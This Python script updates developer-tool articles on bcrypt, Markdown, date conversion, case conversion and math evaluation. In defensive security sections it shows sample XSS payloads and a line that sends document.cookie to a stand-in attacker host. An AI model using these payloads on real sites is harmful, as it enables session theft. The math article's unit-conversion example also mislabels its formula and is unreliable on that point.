#!/usr/bin/env python3
"""
Final batch: expand remaining articles that are close to but under 500 words
bcrypt-password-hashing, markdown-to-html, date-time-converter, case-converter, math-evaluator
"""
import re

ARTICLES_FILE = 'src/pages/articles/articles.data.ts'

def escape_for_ts(content):
    content = content.replace('\\', '\\\\')
    content = content.replace('`', '\\`')
    content = content.replace('${', '\\${')
    return content

def update_article(file_content, slug, new_content):
    escaped = escape_for_ts(new_content)
    pattern = r"(slug:\s*'" + re.escape(slug) + r"'[\s\S]*?content:\s*`)([\s\S]*?)(`\s*,?\s*\})"
    def replacer(m):
        return m.group(1) + escaped + m.group(3)
    new_file_content, count = re.subn(pattern, replacer, file_content, count=1)
    return new_file_content, count > 0

articles = {}

articles['bcrypt-password-hashing-guide'] = r"""## What Is bcrypt?

**bcrypt** is a password hashing function designed by Niels Provos and David Mazieres, presented at USENIX 1999. It remains one of the most widely recommended algorithms for hashing passwords in user authentication systems. Unlike general-purpose hash functions like MD5 or SHA-256 (which are designed to be fast), bcrypt is deliberately slow and computationally expensive — a critical property for password security.

## Why bcrypt for Passwords?

### The Problem with Fast Hash Functions
General cryptographic hash functions like SHA-256 are optimized for speed. Modern hardware can compute billions of SHA-256 hashes per second. This makes brute-force attacks against hashed passwords feasible:
- A GPU can check ~10 billion MD5 hashes/second
- If a database of SHA-256 hashed passwords is leaked, attackers can test billions of guesses per second

### bcrypt's Adaptive Cost Factor
bcrypt includes a **work factor** (also called cost factor) that controls how computationally expensive the hash computation is. Each increment doubles the work:
- Work factor 10: ~100ms per hash
- Work factor 12: ~400ms per hash
- Work factor 14: ~1.6 seconds per hash

An attacker cracking work-factor-12 bcrypt hashes can only test ~2.5 hashes per second on a GPU (compared to billions for MD5). This makes brute-force attacks computationally infeasible for strong passwords.

As hardware gets faster, you can increase the work factor to maintain security. This adaptive property is bcrypt's key advantage.

## bcrypt Hash Format

A bcrypt hash looks like:
```
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu
```

Breaking it down:
- `$2b$` — bcrypt algorithm version (2b is the current recommended version)
- `12` — work factor (cost factor)
- `LQv3c1yqBWVHxkd0LHAkCO` — 22-character Base64-encoded salt (128 bits)
- `Yz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu` — 31-character Base64-encoded hash

The salt and hash are stored together in the single output string — you don't need a separate column for the salt.

## The bcrypt Salting Process

A **salt** is random data added to the password before hashing. bcrypt generates a unique random salt for each password:

```
User sets password: "mysecretpassword"
Random salt:        "LQv3c1yqBWVHxkd0LHAkCO"
Hash input:         salt + password
bcrypt output:      $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/AwB5RoP8YTp7vFyAu
```

Benefits of salting:
- **Prevents rainbow tables**: Pre-computed hash tables are useless because each hash has a unique salt
- **Identical passwords have different hashes**: Two users with "password123" get completely different bcrypt hashes
- **No need to store salt separately**: The salt is embedded in the hash output

## Choosing the Work Factor

OWASP recommends a work factor that takes at least 1 second on your server hardware. As hardware improves, increase the work factor accordingly.

Guidelines:
- **Interactive login** (web app): 10-12 (100ms-400ms)
- **API authentication**: 10-11 (acceptable latency)
- **Offline storage**: 14+ (maximum security)

Test your server and choose the highest work factor that keeps authentication under your latency budget.

## bcrypt in Popular Languages

### Node.js (bcryptjs or bcrypt)
```javascript
const bcrypt = require('bcryptjs');

// Hash a password
const saltRounds = 12;
const hash = await bcrypt.hash('myPassword', saltRounds);

// Verify a password
const isValid = await bcrypt.compare('myPassword', hash);
```

### Python (bcrypt library)
```python
import bcrypt

# Hash
password_hash = bcrypt.hashpw(b'myPassword', bcrypt.gensalt(rounds=12))

# Verify
is_valid = bcrypt.checkpw(b'myPassword', password_hash)
```

### PHP (built-in password_hash)
```php
// Hash
$hash = password_hash('myPassword', PASSWORD_BCRYPT, ['cost' => 12]);

// Verify
$valid = password_verify('myPassword', $hash);
```

## bcrypt Limitations

### 72-Character Password Limit
bcrypt truncates input at 72 bytes. Passwords longer than 72 characters are treated identically regardless of the additional characters. Solutions: pre-hash with SHA-256 or use Argon2id instead.

### Not Suitable for Non-Password Data
bcrypt is designed for passwords (human-memorable, moderate length). For encrypting arbitrary data, use AES. For API key verification, bcrypt is overkill — HMAC-SHA256 is more appropriate.

## Alternatives: Argon2, scrypt

More modern alternatives:
- **Argon2id**: Winner of the Password Hashing Competition (2015). Better memory-hardness. Recommended for new systems.
- **scrypt**: Similar memory-hard design, used in some cryptocurrency systems.

bcrypt remains excellent for most applications due to its long track record and wide library support.

## Using the bcrypt Tool

Our tool:
1. **Hash a password** — enter any password and choose the work factor
2. **Verify a hash** — test if a password matches an existing bcrypt hash
3. **Configure cost factor** — set work factor from 4 (testing) to 14 (maximum)
4. **View timing** — see how long the hash takes at the selected cost factor
5. **Copy result** — one-click copy of the generated hash

Use it for testing bcrypt implementations, generating hashes for development databases, and understanding how work factors affect performance.
"""

articles['markdown-to-html-guide'] = r"""## What Is Markdown?

**Markdown** is a lightweight markup language created by John Gruber in 2004, designed to be easy to read and write as plain text while converting cleanly to HTML. It's used throughout the web for documentation, README files, blog posts, forum posts (Reddit, Stack Overflow), and content management systems.

The key insight behind Markdown: the plain-text source should look like natural text formatting conventions people already use in emails and text documents.

## Core Markdown Syntax

### Headings
```markdown
# H1 Heading
## H2 Heading
### H3 Heading
#### H4 Heading
```

### Emphasis and Inline Code
```markdown
*italic* or _italic_
**bold** or __bold__
***bold italic***
~~strikethrough~~
`inline code`
```

### Links and Images
```markdown
[Link text](https://example.com "Optional title")
![Alt text](image.jpg "Optional title")
[Reference link][reference-id]
[reference-id]: https://example.com
```

### Lists
```markdown
- Unordered item
- Another item
  - Nested item

1. Ordered item
2. Second item
   1. Nested ordered
```

### Code Blocks
Fenced code blocks with optional syntax highlighting:
```markdown
    ```javascript
    function hello() {
      console.log("Hello, World!");
    }
    ```
```

### Blockquotes
```markdown
> This is a blockquote.
> It can span multiple lines.
>
> And multiple paragraphs.
```

### Tables (Extended Markdown)
```markdown
| Column 1 | Column 2 | Column 3 |
|----------|----------|----------|
| Cell A   | Cell B   | Cell C   |
| Cell D   | Cell E   | Cell F   |
```

## CommonMark: The Standard

Original Markdown had ambiguous specifications. CommonMark (commonmark.org) is a strict, unambiguous specification adopted by GitHub, GitLab, Stack Overflow, and many other platforms. GitHub Flavored Markdown (GFM) extends CommonMark with task lists, tables, and autolinked URLs.

## Markdown Processing Libraries

### JavaScript
- **marked**: Fast, compact, widely used
- **markdown-it**: Fully featured with plugin ecosystem
- **remark**: Unified ecosystem, AST-based processing
- **micromark**: Smallest CommonMark-compliant parser

### Python
- **Python-Markdown**: The standard library
- **mistune**: Fast with extensible rendering
- **marko**: CommonMark-compliant

### Server-Side vs. Client-Side Rendering
For performance and SEO, prefer server-side Markdown rendering. Client-side rendering requires shipping the parser to the browser and delays first meaningful paint.

## Security: XSS in Markdown-to-HTML

Markdown can contain raw HTML, which is rendered as-is by default. This creates XSS vulnerabilities when processing user-generated Markdown:

Malicious input:
```markdown
[Click me](javascript:alert('xss'))
<script>steal(document.cookie)</script>
<img src="x" onerror="maliciousCode()">
```

**Always sanitize HTML output** from Markdown converters when displaying user content. Use DOMPurify (browser) or sanitize-html (Node.js) after converting Markdown to HTML.

## Markdown in Different Contexts

### README Files (GitHub/GitLab)
Project documentation uses extensive Markdown features: badges, collapsible sections, mermaid diagrams, and code syntax highlighting.

### Static Site Generators
Jekyll, Hugo, Gatsby, Next.js, Astro, and others process Markdown files into HTML pages. Frontmatter YAML at the top of files provides metadata:
```markdown
---
title: My Blog Post
date: 2024-01-15
tags: [webdev, javascript]
---

# Post Content Here
```

### Documentation Tools
Docusaurus, MkDocs, GitBook, and Notion all use Markdown as their primary authoring format.

## Using the Markdown-to-HTML Converter

Our tool:
1. **Write or paste Markdown** in the input panel
2. **See live HTML output** with real-time preview rendering
3. **View rendered HTML** — see how it looks in a browser
4. **Copy HTML source** — get the raw HTML for use in your application
5. **GitHub Flavored Markdown** — supports tables, task lists, and auto-links

Use it for previewing Markdown formatting, generating HTML from documentation, and testing how your Markdown source will render on different platforms.
"""

articles['date-time-converter-guide'] = r"""## Working with Dates and Times in Software

Date and time handling is famously complex in software development. Timezones, daylight saving time, leap years, different calendar systems, and inconsistent format standards make dates one of the most error-prone areas of programming.

A good date/time conversion tool helps developers and data professionals quickly convert between formats, timezones, and representations without needing to memorize every standard.

## Unix Timestamps

A **Unix timestamp** (also called epoch time or POSIX time) is the number of seconds elapsed since the Unix Epoch: January 1, 1970, 00:00:00 UTC. This is the fundamental time representation in Unix/Linux systems and widely used in databases, APIs, and logs.

Examples:
- `0` = 1970-01-01 00:00:00 UTC
- `1000000000` = 2001-09-09 01:46:40 UTC
- `1700000000` = 2023-11-14 22:13:20 UTC

**Millisecond timestamps** are common in JavaScript (`Date.now()` returns milliseconds). Python's `time.time()` returns seconds with fractional precision.

## ISO 8601 Format

**ISO 8601** is the international standard for date and time representations:
```
2024-01-15T14:30:45Z           (UTC)
2024-01-15T14:30:45+05:30      (UTC+5:30, India)
2024-01-15T14:30:45-08:00      (UTC-8, US Pacific)
2024-01-15T14:30:45.123Z       (with milliseconds)
2024-01-15                     (date only)
14:30:45                       (time only)
```

ISO 8601 is the recommended format for:
- API request/response bodies
- Database storage
- Log files
- Data exchange between systems

## Common Date Formats

Different regions and systems use different date formats:

| Format | Example | Region/System |
|--------|---------|---------------|
| YYYY-MM-DD | 2024-01-15 | ISO 8601, databases |
| MM/DD/YYYY | 01/15/2024 | United States |
| DD/MM/YYYY | 15/01/2024 | UK, Europe, Australia |
| DD.MM.YYYY | 15.01.2024 | Germany, Eastern Europe |
| YYYY年MM月DD日 | 2024年01月15日 | Japan/China (CJK) |
| RFC 2822 | Mon, 15 Jan 2024 14:30:45 +0000 | Email, HTTP headers |

## Timezones and UTC

**UTC (Coordinated Universal Time)** is the primary time standard. All other timezones are defined as offsets from UTC.

Common timezone offsets:
- UTC+0: UK (winter), Western Europe
- UTC+1 to UTC+2: Central/Eastern Europe
- UTC+5:30: India (IST)
- UTC+8: China (CST), Singapore
- UTC+9: Japan (JST)
- UTC-5: US Eastern (EST)
- UTC-8: US Pacific (PST)

**Daylight Saving Time (DST)** complicates timezone offsets. Many regions shift clocks by 1 hour seasonally. For this reason, store timestamps in UTC and convert to local time only for display.

## Date Arithmetic

Common date calculations:
- **Duration**: Difference between two timestamps (days, hours, minutes)
- **Date addition**: Add N days/months/years to a date
- **Day of week**: Determine which weekday a date falls on
- **Quarter**: Which fiscal/calendar quarter a date belongs to
- **Week number**: ISO week number of the year

## Programming with Dates

### JavaScript
```javascript
const now = new Date();
const timestamp = Date.now(); // milliseconds since epoch
const isoString = now.toISOString(); // "2024-01-15T14:30:45.123Z"

// Modern approach with Temporal API (Stage 3)
const datetime = Temporal.Now.plainDateTimeISO();
```

### Python
```python
from datetime import datetime, timezone
now = datetime.now(timezone.utc)
timestamp = now.timestamp()  # seconds since epoch
iso_string = now.isoformat()
```

## Using the Date-Time Converter Tool

Our tool:
1. **Enter any date format** — Unix timestamp, ISO 8601, or common local formats
2. **Convert to all formats** — see the same moment in multiple representations
3. **Timezone conversion** — convert between any two IANA timezones
4. **Relative time** — shows "3 days ago" or "in 2 hours" for context
5. **DST awareness** — correctly handles daylight saving transitions
6. **Copy any format** — one-click copy of any representation

Use it for debugging timestamp issues, converting between API formats, and understanding how a given moment appears in different timezones.
"""

articles['case-converter-guide'] = r"""## What Is Case Conversion?

**Case conversion** is the process of transforming text between different capitalization and word separation conventions. Different programming languages, file systems, database schemas, and writing styles use different naming conventions, and converting between them is a frequent developer task.

## Text Case Types

### Lowercase
All characters in lowercase: `hello world`

### UPPERCASE
All characters in uppercase: `HELLO WORLD`

### Title Case
First letter of each significant word capitalized: `Hello World`

### Sentence case
First letter of sentence capitalized: `Hello world`

## Programming Naming Conventions

### camelCase
Words joined without spaces, first word lowercase, subsequent words capitalized:
```
helloWorld
getUserById
calculateTotalPrice
```
Used in: JavaScript variables and functions, Java methods, Swift properties, TypeScript

### PascalCase (UpperCamelCase)
Like camelCase but first word also capitalized:
```
HelloWorld
UserProfile
DatabaseConnection
```
Used in: JavaScript/TypeScript class names, C# types, React components, Pascal language (hence the name)

### snake_case
Words separated by underscores, all lowercase:
```
hello_world
user_id
get_user_by_id
```
Used in: Python variables and functions, Ruby, PHP, SQL column names, file names in many Unix conventions

### SCREAMING_SNAKE_CASE (CONSTANT_CASE)
Like snake_case but all uppercase:
```
MAX_RETRY_COUNT
DEFAULT_TIMEOUT_MS
API_BASE_URL
```
Used in: Constants in most languages, environment variables, C/C++ macros

### kebab-case (dash-case, param-case)
Words separated by hyphens, all lowercase:
```
hello-world
user-profile
get-user-by-id
```
Used in: CSS class names, HTML attributes, URL slugs, npm package names, Kubernetes manifest names

### dot.case
Words separated by dots:
```
hello.world
com.example.app
org.springframework.boot
```
Used in: Java package names, configuration keys (Spring Boot, etc.), domain-reversed package identifiers

### path/case
Words separated by forward slashes:
```
hello/world
src/components/button
```
Used in: File paths, URL paths, import paths in some systems

### Header-Case (Train-Case)
Words separated by hyphens, each word capitalized:
```
Hello-World
Content-Type
Authorization
```
Used in: HTTP headers

## Why Case Conversion Matters

### Cross-Language Integration
JavaScript APIs typically use camelCase, while REST API endpoints often use kebab-case, and databases use snake_case. When building systems that span these layers, consistent conversion is essential.

### Code Generation
When generating code from external sources (database schemas, API definitions, config files), you need to convert names to the target language's convention.

### Data Import
Spreadsheet column headers (Title Case) need conversion to database column names (snake_case) or API field names (camelCase).

### Documentation and Communication
Technical writers converting between formal writing (Title Case) and code references (camelCase, snake_case).

## Conversion Rules

### Splitting Words
Case conversion first splits text into individual words, then rejoins in the target format. Word boundaries are detected at:
- Transitions from lowercase to uppercase (camelCase splitting)
- Spaces and existing separators (-, _, ., /, space)
- Consecutive uppercase letters followed by lowercase (APIResponse → API + Response)

### Preserving Acronyms
Acronyms like "HTML", "API", "URL", "ID" need special handling. Different style guides disagree:
- `htmlParser` vs `HTMLParser` (camelCase for HTML)
- `apiKey` vs `APIKey` (camelCase for API)
- `userId` vs `userID` (camelCase for ID)

Many converters provide options for acronym handling.

## Using the Case Converter Tool

Our tool:
1. **Enter any text** — handles any mix of case conventions as input
2. **Select target format** — camelCase, PascalCase, snake_case, kebab-case, and more
3. **Batch conversion** — convert multiple lines at once for bulk renaming
4. **Smart word splitting** — correctly splits on boundaries in any input format
5. **Copy result** — one-click copy in the target case format
6. **Acronym options** — choose how to handle common abbreviations

Use it for renaming variables across codebases, converting database column names to API field names, generating code from documentation, and creating consistent naming in multi-language projects.
"""

articles['math-evaluator-guide'] = r"""## What Is a Math Expression Evaluator?

A **math expression evaluator** (or math parser) takes a mathematical expression as text input and computes its numeric result. Rather than a simple calculator with buttons, an expression evaluator accepts free-form mathematical notation: `(3 + 4) * 2`, `sin(pi/4)`, `2^10`, or complex formulas combining arithmetic, functions, and constants.

This is more powerful than a button calculator for:
- Complex multi-operator expressions
- Scientific and engineering calculations
- Quick formula testing
- Educational exploration of math

## Expression Syntax

A math evaluator supports a richer syntax than simple arithmetic:

### Basic Arithmetic
- Addition: `3 + 4` → 7
- Subtraction: `10 - 3.5` → 6.5
- Multiplication: `6 * 7` → 42
- Division: `15 / 4` → 3.75
- Integer division: `15 // 4` → 3 (floor division)
- Modulo: `17 % 5` → 2
- Exponentiation: `2^10` or `2**10` → 1024

### Order of Operations (PEMDAS/BODMAS)
Standard mathematical operator precedence:
1. Parentheses first: `(3 + 4) * 2` → 14
2. Exponents: `2^3 + 1` → 9
3. Multiplication/Division (left to right): `6 / 2 * 3` → 9
4. Addition/Subtraction (left to right): `10 - 3 + 2` → 9

### Mathematical Functions
- Trigonometry: `sin(x)`, `cos(x)`, `tan(x)`, `asin(x)`, `acos(x)`, `atan(x)`
- Hyperbolic: `sinh(x)`, `cosh(x)`, `tanh(x)`
- Logarithms: `log(x)` (natural log), `log10(x)` (base-10), `log2(x)`
- Powers/Roots: `sqrt(x)`, `cbrt(x)`, `pow(x, y)`
- Rounding: `floor(x)`, `ceil(x)`, `round(x)`
- Absolute value: `abs(x)`

### Mathematical Constants
- `pi` or `π` → 3.14159265358979...
- `e` (Euler's number) → 2.71828182845904...
- `phi` (Golden ratio) → 1.61803398874989...
- `inf` → Infinity
- `tau` → 2π = 6.28318...

### Example Expressions
```
2^32 - 1          → 4294967295 (max uint32)
sqrt(144)         → 12
sin(pi/2)         → 1
log(e)            → 1
(1 + sqrt(5)) / 2 → 1.618... (golden ratio)
factorial(10)     → 3628800
ceil(4.3)         → 5
abs(-42)          → 42
```

## Floating-Point Precision

Computer arithmetic uses IEEE 754 floating-point representation, which can produce surprising results:

```
0.1 + 0.2 = 0.30000000000000004
```

This is not a bug but a fundamental property of binary floating-point representation. Decimal fractions like 0.1 cannot be represented exactly in binary, just as 1/3 cannot be represented exactly in decimal.

For financial calculations, specialized decimal libraries are needed. For scientific work, the precision (about 15-16 significant decimal digits for 64-bit floats) is usually sufficient.

## Symbolic vs. Numeric Evaluation

A basic math evaluator performs **numeric evaluation** — it computes a single numeric result from specific values.

More advanced **computer algebra systems** (CAS) perform **symbolic evaluation** — they manipulate mathematical expressions algebraically:
- `d/dx (x^2)` → `2x` (differentiation)
- `integrate(2x, x)` → `x^2 + C` (integration)
- `solve(x^2 - 4, x)` → `x = 2, x = -2` (equation solving)
- `expand((x+1)^3)` → `x^3 + 3x^2 + 3x + 1` (expansion)

Systems like Wolfram Alpha, Mathematica, SymPy (Python), and Matlab offer symbolic computation. Browser-based numeric evaluators are simpler but sufficient for most practical needs.

## Safe Expression Parsing

Parsing user-provided mathematical expressions requires care:

### Never Use eval()
The JavaScript `eval()` function executes arbitrary code, creating serious security vulnerabilities if user input is passed directly. An attacker could enter `fetch('attacker.com?data='+document.cookie)`.

### Use a Math Parser Library
Safe alternatives use dedicated parsing libraries like math.js, expr-eval, or mathjs that only evaluate mathematical expressions:
```javascript
const math = require('mathjs');
const result = math.evaluate('2 + 3 * 4'); // Safe: 14
```

## Practical Applications

- **Quick calculations**: Faster than opening a calculator app
- **Formula testing**: Test mathematical formulas before coding them
- **Unit conversion**: `32 * 9/5 + 32` for Fahrenheit to Celsius
- **Engineering**: Complex equations with scientific notation
- **Finance**: Compound interest, loan calculations, percentages
- **Education**: Exploring mathematical concepts interactively

## Using the Math Evaluator Tool

Our tool:
1. **Enter any expression** — full mathematical notation supported
2. **Instant evaluation** — real-time computation as you type
3. **History** — review previous calculations
4. **Function reference** — see all supported functions and constants
5. **Scientific notation** — displays very large and very small numbers appropriately
6. **Copy result** — one-click copy of the computed value

The evaluator safely parses expressions without using eval(), supporting the full range of mathematical operations and functions.
"""

# Main execution
def main():
    with open(ARTICLES_FILE, 'r') as f:
        content = f.read()

    updated_count = 0
    for slug, article_content in articles.items():
        content, success = update_article(content, slug, article_content)
        if success:
            updated_count += 1
            print(f'Updated: {slug}')
        else:
            print(f'NOT FOUND: {slug}')

    with open(ARTICLES_FILE, 'w') as f:
        f.write(content)

    print(f'\nTotal updated: {updated_count}/{len(articles)}')

if __name__ == '__main__':
    main()
